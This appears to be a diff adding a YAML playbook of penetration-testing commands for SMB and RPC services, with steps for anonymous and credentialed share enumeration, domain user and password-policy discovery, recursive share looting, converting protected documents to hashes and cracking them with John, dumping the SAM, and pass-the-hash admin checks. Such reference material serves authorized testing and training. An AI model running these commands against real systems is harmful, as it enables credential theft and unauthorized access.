@@ -1,0 +1,162 @@
+version: 1
+
+commands:
+  - id: smb-anonymous-checks
+    title: Quick anonymous SMB checks
+    source: "Enumeration/Services/135, 445 - SMB.md"
+    requires: []
+    useful_when: [Username, Password, Hash]
+    services: [SMB]
+    attack_types: [Enumeration]
+    executor: [Linux]
+    target_types: []
+    outputs: [Hostname, Domain, Workgroup, Signing, SMBVersion, Shares]
+    next: [SMBEnum, Looting, RelayCheck]
+    steps:
+      - "# Fingerprint SMB and collect host/domain/signing details."
+      - "nxc smb <TARGET_IP>"
+      - "# Test anonymous share listing."
+      - "nxc smb <TARGET_IP> -u '' -p '' --shares"
+      - "# List SMB shares with smbclient null auth."
+      - "smbclient -L //<TARGET_IP>/ -N"
+
+  - id: smb-share-access-creds
+    title: Check SMB share access with credentials
+    source: "Enumeration/Services/135, 445 - SMB.md"
+    requires: [Username, Password]
+    useful_when: [Username, Password]
+    services: [SMB]
+    attack_types: [Enumeration, Looting]
+    executor: [Linux]
+    target_types: []
+    outputs: [Shares, Files, ProtectedFile]
+    next: [Looting, Crack]
+    steps:
+      - "# List shares with valid credentials."
+      - "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --shares"
+      - "# List shares with smbclient."
+      - "smbclient -L //<TARGET_IP>/ -U '<DOMAIN>/<USER>%<PASS>'"
+      - "# Open a specific readable share."
+      - "smbclient //<TARGET_IP>/<SHARE> -U '<DOMAIN>/<USER>%<PASS>'"
+
+  - id: rpc-users-groups-null
+    title: Enumerate users and groups with anonymous RPC
+    source: "Enumeration/Services/135, 445 - SMB.md"
+    requires: []
+    useful_when: [Username, Password]
+    services: [RPC]
+    attack_types: [Enumeration]
+    executor: [Linux]
+    target_types: [ActiveDirectory]
+    outputs: [Users, Groups]
+    next: [ASREP, PasswordSpray, LDAPEnum]
+    steps:
+      - "# Start an anonymous RPC session."
+      - "rpcclient -U '' -N <TARGET_IP>"
+      - "# Enumerate domain users and groups."
+      - "enumdomusers"
+      - "enumdomgroups"
+      - "# Dump display info for quick username building."
+      - "querydispinfo"
+
+  - id: smb-domain-enum-creds
+    title: Enumerate domain users groups and password policy over SMB
+    source: "Enumeration/Services/135, 445 - SMB.md"
+    requires: [Username, Password]
+    useful_when: [Username, Password]
+    services: [SMB]
+    attack_types: [Enumeration]
+    executor: [Linux]
+    target_types: [ActiveDirectory]
+    outputs: [Users, Groups, PasswordPolicy]
+    next: [ASREP, Kerberoast, PasswordSpray, PrivilegeEscalation]
+    steps:
+      - "# Enumerate domain users."
+      - "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --users"
+      - "# Enumerate domain groups."
+      - "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --groups"
+      - "# Check password and lockout policy before spraying."
+      - "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --pass-pol"
+
+  - id: smb-loot-shares-creds
+    title: Loot readable SMB shares
+    source: "Enumeration/Services/135, 445 - SMB.md"
+    requires: [Username, Password]
+    useful_when: [Username, Password]
+    services: [SMB]
+    attack_types: [Enumeration, Looting]
+    executor: [Linux]
+    target_types: []
+    outputs: [Files, Credentials, ProtectedFile, Hash]
+    next: [Crack, CredentialReuse]
+    steps:
+      - "# Spider all readable shares."
+      - "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M spider_plus"
+      - "# Spider one specific readable share."
+      - "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M spider_plus -o SHARE='<SHARE>'"
+      - "# Open the share and recursively download files."
+      - "smbclient //<TARGET_IP>/<SHARE> -U '<DOMAIN>/<USER>%<PASS>'"
+      - "recurse ON"
+      - "prompt OFF"
+      - "mget *"
+
+  - id: crack-protected-files
+    title: Convert protected documents to crackable hashes
+    source: "Enumeration/Services/135, 445 - SMB.md"
+    requires: [ProtectedFile]
+    useful_when: [ProtectedFile]
+    services: []
+    attack_types: [Crack]
+    executor: [Linux]
+    target_types: []
+    outputs: [Hash]
+    next: [JohnCrack]
+    steps:
+      - "# Convert a protected PDF to a John hash."
+      - "pdf2john file.pdf > file.hash"
+      - "# Convert protected Office documents to John hashes."
+      - "office2john file.xlsx > file.hash"
+      - "office2john file.docx > file.hash"
+
+  - id: crack-hash-john
+    title: Crack hash with John
+    source: "Enumeration/Services/135, 445 - SMB.md"
+    requires: [Hash]
+    useful_when: [Hash]
+    services: []
+    attack_types: [Crack]
+    executor: [Linux]
+    target_types: []
+    outputs: [Password]
+    next: [CredentialReuse]
+    command: "john file.hash --wordlist=/usr/share/wordlists/rockyou.txt"
+
+  - id: smb-admin-creds-and-sam
+    title: Check SMB admin rights and dump SAM with credentials
+    source: "Enumeration/Services/135, 445 - SMB.md"
+    requires: [Username, Password]
+    useful_when: [Username, Password]
+    services: [SMB, NTLM]
+    attack_types: [Exploitation]
+    executor: [Linux]
+    target_types: [Windows]
+    outputs: [LocalAdmin, Hash]
+    next: [CredentialDumping, Crack, PassTheHash, LateralMovement]
+    steps:
+      - "# Check whether the credentials have local admin rights."
+      - "nxc smb <TARGET_IP> -u <USER> -p '<PASS>'"
+      - "# Dump the local SAM if admin rights are available."
+      - "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --sam"
+
+  - id: smb-admin-hash-nxc
+    title: Check SMB local admin with NTLM hash
+    source: "Enumeration/Services/135, 445 - SMB.md"
+    requires: [Username, Hash]
+    useful_when: [Username, Hash]
+    services: [SMB, NTLM]
+    attack_types: [Exploitation]
+    executor: [Linux]
+    target_types: [Windows]
+    outputs: [LocalAdmin]
+    next: [CredentialDumping, LateralMovement]
+    command: "nxc smb <TARGET_IP> -u <USER> -H <NTLM_HASH>"
